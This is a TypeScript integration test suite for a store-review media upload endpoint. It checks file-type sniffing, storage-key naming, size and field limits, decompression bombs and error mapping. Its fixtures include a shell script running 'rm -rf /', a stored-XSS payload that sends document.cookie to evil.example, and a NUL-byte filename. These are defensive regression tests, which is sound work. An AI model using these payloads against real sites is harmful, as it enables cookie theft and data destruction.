import { medusaIntegrationTestRunner } from '@medusajs/test-utils'
import sharp from 'sharp'
import { getPublishableKeyHeaders } from '../helpers/store'

async function png(): Promise<Buffer> {
  return await sharp({
    create: { width: 4, height: 4, channels: 3, background: '#123456' },
  })
    .png()
    .toBuffer()
}

medusaIntegrationTestRunner({
  inApp: true,
  testSuite: ({ api, getContainer }) => {
    describe('POST /store/reviews/uploads', () => {
      let storeHeaders: Record<string, string>

      beforeAll(async () => {
        storeHeaders = await getPublishableKeyHeaders(getContainer())
      })

      it('accepts an image and returns media without exposing the storage path', async () => {
        const form = new FormData()
        form.append('files', new Blob([await png()] as BlobPart[], { type: 'image/png' }), 'photo.png')

        const response = await api.post('/store/reviews/uploads', form, {
          headers: storeHeaders,
        })

        expect(response.status).toEqual(201)
        expect(response.data.media).toHaveLength(1)
        expect(response.data.media[0].type).toEqual('image')
        expect(Object.keys(response.data.media[0]).sort()).toEqual(
          ['id', 'mime_type', 'thumbnail_url', 'type', 'url'].sort()
        )
      })

      it('rejects a shell script renamed to .png', async () => {
        const form = new FormData()
        form.append(
          'files',
          new Blob([Buffer.from('#!/bin/sh\nrm -rf /')] as BlobPart[], { type: 'image/png' }),
          'evil.png'
        )

        const response = await api
          .post('/store/reviews/uploads', form, { headers: storeHeaders })
          .catch((e) => e.response)

        expect(response.status).toEqual(400)
      })

      // C1 regression. The client's filename must never reach the storage
      // key, because the default (local) file provider derives its key from
      // the filename verbatim and core mounts that directory with a bare
      // `express.static`, which picks Content-Type from the EXTENSION and
      // ignores the mimeType this plugin sniffed. Video is deliberately not
      // re-encoded, so an HTML/JS payload behind MP4 magic bytes survives
      // byte-for-byte - and /static is the same origin as the admin
      // dashboard. The fix is that the stored name is derived ENTIRELY from
      // the sniffed MIME plus a crypto-random token: no byte of the client
      // filename reaches the key, sanitized or otherwise.
      it('never lets the client filename reach the storage key or the served Content-Type', async () => {
        const payload = Buffer.concat([
          Buffer.from([0x00, 0x00, 0x00, 0x20]),
          Buffer.from('ftypisom', 'ascii'),
          Buffer.from(
            '\n<html><body><script>fetch("//evil.example/"+document.cookie)</script>PWNED</body></html>',
            'ascii'
          ),
        ])

        const form = new FormData()
        form.append(
          'files',
          new Blob([payload] as BlobPart[], { type: 'video/mp4' }),
          'pwn.html'
        )

        const response = await api.post('/store/reviews/uploads', form, {
          headers: storeHeaders,
        })

        expect(response.status).toEqual(201)

        const url: string = response.data.media[0].url

        expect(url.endsWith('.html')).toBe(false)
        expect(url).toMatch(/\.mp4$/)
        // Not "does not end in .html" alone: no fragment of the attacker's
        // name may survive anywhere in the key, not as a stem, not as a
        // sanitized suffix.
        expect(url).not.toContain('pwn')
        expect(url).not.toContain('html')
        expect(response.data.media[0].mime_type).toEqual('video/mp4')

        // The served header is the half that actually decides whether this
        // is stored XSS. /static is mounted by core's express-loader on the
        // same app the test harness boots, so it is reachable here.
        const served = await api.get(new URL(url).pathname, {
          headers: storeHeaders,
          responseType: 'arraybuffer',
        })

        expect(served.status).toEqual(200)
        expect(served.headers['content-type']).not.toMatch(/text\/html/)
        expect(served.headers['content-type']).toMatch(/video\/mp4/)
      })

      /**
       * The claim the README makes is that the served `Content-Type` is one
       * this plugin chooses and never one an attacker controls. That claim
       * was false before the filename fix, so it is worth holding exactly
       * true rather than approximately: this walks every accepted format,
       * uploads each under the name `evil.html`, and pins both the
       * extension the plugin chose and the header core actually emits.
       *
       * AVIF is the one format where the emitted header is NOT the sniffed
       * type: core serves /static through `send` -> `mime@1.6.0`, whose
       * table predates AVIF, so it answers `application/octet-stream`. That
       * is not attacker-controlled and per the MIME Sniffing spec is not a
       * sniffable type, so it is a correctness wrinkle rather than a
       * security one - but the README says so explicitly, and if core ever
       * upgrades `mime` this test fails and the README needs updating with
       * it.
       */
      const SERVED_CONTENT_TYPE: Record<string, string> = {
        'image/png': 'image/png',
        'image/jpeg': 'image/jpeg',
        'image/webp': 'image/webp',
        'image/avif': 'application/octet-stream',
        'video/mp4': 'video/mp4',
        'video/webm': 'video/webm',
      }

      const EXPECTED_EXTENSION: Record<string, string> = {
        'image/png': 'png',
        'image/jpeg': 'jpg',
        'image/webp': 'webp',
        'image/avif': 'avif',
        'video/mp4': 'mp4',
        'video/webm': 'webm',
      }

      async function fixtureFor(mime: string): Promise<Buffer> {
        if (mime === 'video/mp4') {
          return Buffer.concat([
            Buffer.from([0x00, 0x00, 0x00, 0x20]),
            Buffer.from('ftypisom', 'ascii'),
            Buffer.alloc(32),
          ])
        }

        if (mime === 'video/webm') {
          const docType = 'webm'
          const offset = 20
          const buffer = Buffer.alloc(64)
          buffer[0] = 0x1a
          buffer[1] = 0x45
          buffer[2] = 0xdf
          buffer[3] = 0xa3
          buffer[offset] = 0x42
          buffer[offset + 1] = 0x82
          buffer[offset + 2] = 0x80 | docType.length
          buffer.write(docType, offset + 3, 'ascii')
          return buffer
        }

        const format = mime.split('/')[1] as 'png' | 'jpeg' | 'webp' | 'avif'
        return await sharp({
          create: { width: 8, height: 8, channels: 3, background: '#123456' },
        })
          [format]()
          .toBuffer()
      }

      it.each(Object.keys(SERVED_CONTENT_TYPE))(
        'serves %s under a plugin-chosen extension and a non-text Content-Type',
        async (mime) => {
          const form = new FormData()
          form.append(
            'files',
            new Blob([await fixtureFor(mime)] as BlobPart[], { type: 'text/html' }),
            'evil.html'
          )

          const response = await api.post('/store/reviews/uploads', form, {
            headers: storeHeaders,
          })

          expect(response.status).toEqual(201)
          expect(response.data.media[0].mime_type).toEqual(mime)

          const url: string = response.data.media[0].url
          expect(url.endsWith(`.${EXPECTED_EXTENSION[mime]}`)).toBe(true)
          expect(url).not.toContain('evil')

          const served = await api.get(new URL(url).pathname, {
            headers: storeHeaders,
            responseType: 'arraybuffer',
          })

          const contentType = String(served.headers['content-type'])

          // The security property, unconditional for every format: nothing
          // an attacker uploads is ever served as a renderable text type.
          expect(contentType).not.toMatch(/^text\//)

          // The precise property, per format - this is what the README
          // documents.
          expect(contentType.split(';')[0].trim()).toEqual(SERVED_CONTENT_TYPE[mime])
        }
      )

      it('rejects a request with no files', async () => {
        const response = await api
          .post('/store/reviews/uploads', new FormData(), { headers: storeHeaders })
          .catch((e) => e.response)

        expect(response.status).toEqual(400)
      })

      // Proves the multer `limits.fileSize` ceiling (100MB, set in
      // src/api/store/reviews/middlewares.ts) is enforced at the transport
      // layer, before a single byte is buffered into the route/workflow -
      // not by the workflow's own settings-driven max_image_size_mb/
      // max_video_size_mb check, which is a distinct, later gate. The
      // resulting MulterError is converted by uploadReviewMediaFiles in
      // middlewares.ts into an actionable 4xx (see that file for why: left
      // unconverted this used to surface as an opaque 500 - see this
      // file's git history/the report for that earlier, now-fixed state).
      it('rejects a file larger than the multer fileSize ceiling, at the transport layer, with an actionable message', async () => {
        const oversized = Buffer.alloc(100 * 1024 * 1024 + 1)

        const form = new FormData()
        form.append('files', new Blob([oversized] as BlobPart[], { type: 'image/png' }), 'huge.png')

        const response = await api
          .post('/store/reviews/uploads', form, { headers: storeHeaders })
          .catch((e) => e.response)

        expect(response.status).toEqual(400)
        expect(response.data.message).toMatch(/100MB/)
        expect(response.data.message.toLowerCase()).toContain('size')
      })

      // Proves the multer `limits.files` ceiling (20) is enforced at the
      // transport layer too, independent of the workflow's
      // max_media_per_review setting (default 5, checked later and
      // separately - see upload-review-media.spec.ts for that case).
      it('rejects a request with more files than the multer files ceiling, with an actionable message', async () => {
        const form = new FormData()
        for (let i = 0; i < 21; i++) {
          form.append('files', new Blob([Buffer.from('x')] as BlobPart[], { type: 'image/png' }), `f${i}.png`)
        }

        const response = await api
          .post('/store/reviews/uploads', form, { headers: storeHeaders })
          .catch((e) => e.response)

        expect(response.status).toEqual(400)
        expect(response.data.message).toMatch(/20/)
        expect(response.data.message.toLowerCase()).toContain('files')
      })

      // multer's defaults leave `fields` and `parts` at Infinity and cap
      // only `fieldSize`, so an unauthenticated caller could push an
      // unbounded number of non-file form fields straight into req.body -
      // 300 x 100KB was accepted in 72ms. This endpoint reads no text
      // fields at all, so the limit is zero of them.
      it('rejects non-file form fields outright', async () => {
        const form = new FormData()
        form.append('files', new Blob([await png()] as BlobPart[], { type: 'image/png' }), 'photo.png')
        for (let i = 0; i < 300; i++) {
          form.append(`junk${i}`, 'x'.repeat(100 * 1024))
        }

        const response = await api
          .post('/store/reviews/uploads', form, { headers: storeHeaders })
          .catch((e) => e.response)

        expect(response.status).toEqual(400)
        expect(response.data.message.toLowerCase()).toContain('file parts only')
      })

      // A sharp/libvips rejection is a plain Error with no statusCode and
      // no MedusaError `.type`, so it used to fall through the framework's
      // error-handler switch to `500 {"code":"unknown_error"}`. A malformed
      // photo is one of the most likely things a shopper does here; it must
      // read as a client error, not a server fault - the same reasoning
      // that already produced toClientUploadError for MulterError.
      it('reports an undecodable image as an actionable 400, not an opaque 500', async () => {
        const corrupt = Buffer.concat([
          Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
          Buffer.from('this is not actually a png'.repeat(8)),
        ])

        const form = new FormData()
        form.append('files', new Blob([corrupt] as BlobPart[], { type: 'image/png' }), 'broken.png')

        const response = await api
          .post('/store/reviews/uploads', form, { headers: storeHeaders })
          .catch((e) => e.response)

        expect(response.status).toEqual(400)
        expect(response.data.type).toEqual('invalid_data')
        expect(response.data.message).toContain('broken.png')
      })

      // 789 bytes of request body declaring 6000x6000. Without a pixel
      // budget this is ~500ms of server CPU per file, from an endpoint that
      // needs only a publishable key - and it succeeded.
      it('rejects a decompression bomb with a 400 rather than decoding it', async () => {
        const bomb = await sharp({
          create: { width: 6000, height: 6000, channels: 3, background: '#123456' },
        })
          .avif({ quality: 1, effort: 0 })
          .toBuffer()

        expect(bomb.length).toBeLessThan(10 * 1024)

        const form = new FormData()
        form.append('files', new Blob([bomb] as BlobPart[], { type: 'image/avif' }), 'bomb.avif')

        const response = await api
          .post('/store/reviews/uploads', form, { headers: storeHeaders })
          .catch((e) => e.response)

        expect(response.status).toEqual(400)
        expect(response.data.type).toEqual('invalid_data')
        expect(response.data.message).toMatch(/6000x6000/)
      })

      // A NUL byte in the filename makes busboy's part-header parser throw
      // a bare Error ("Malformed part header"), which is neither a
      // MulterError nor a MediaDecodeError - so it fell through both
      // conversions to an opaque 500 for a body the client malformed.
      // Hand-built rather than via FormData: a native FormData would
      // sanitise the filename before it ever reached the wire.
      it('reports a malformed multipart part header as a 400, not a 500', async () => {
        const boundary = 'MALFORMEDPARTBOUNDARY'
        const body = Buffer.from(
          [
            `--${boundary}`,
            `Content-Disposition: form-data; name="files"; filename="sh\u0000ort.png"`,
            'Content-Type: image/png',
            '',
            'somebytes',
            `--${boundary}--`,
            '',
          ].join('\r\n'),
          'binary'
        )

        const response = await api
          .post('/store/reviews/uploads', body, {
            headers: {
              ...storeHeaders,
              'content-type': `multipart/form-data; boundary=${boundary}`,
            },
          })
          .catch((e) => e.response)

        expect(response.status).toEqual(400)
        expect(response.data.type).toEqual('invalid_data')
        expect(response.data.message.toLowerCase()).toContain('malformed')
      })

      // Proves the conversion in uploadReviewMediaFiles is narrowly scoped:
      // ONLY a multer.MulterError is converted to a 4xx. A genuine parse
      // failure that is NOT a MulterError - Busboy's own constructor
      // throws a plain Error ("Boundary not found") when the Content-Type
      // header is multipart/form-data but omits the required `boundary`
      // parameter, and multer's make-middleware.js passes that raw error
      // straight to next() without wrapping it - must still propagate
      // untouched and surface as a genuine 500, not be laundered into a
      // false 400. This is deliberately a raw Buffer body with a hand-set
      // header (not FormData/Blob): a native FormData body would force
      // axios to compute its own correct multipart Content-Type with a
      // boundary, which would defeat the point of this test.
      it('does not convert a non-multer parse error - it still surfaces as a 500', async () => {
        const body = Buffer.from(
          [
            '--MISSING',
            'Content-Disposition: form-data; name="files"; filename="a.png"',
            'Content-Type: image/png',
            '',
            'somebytes',
            '--MISSING--',
            '',
          ].join('\r\n')
        )

        const response = await api
          .post('/store/reviews/uploads', body, {
            headers: { ...storeHeaders, 'content-type': 'multipart/form-data' },
          })
          .catch((e) => e.response)

        expect(response.status).toEqual(500)
      })
    })
  },
})
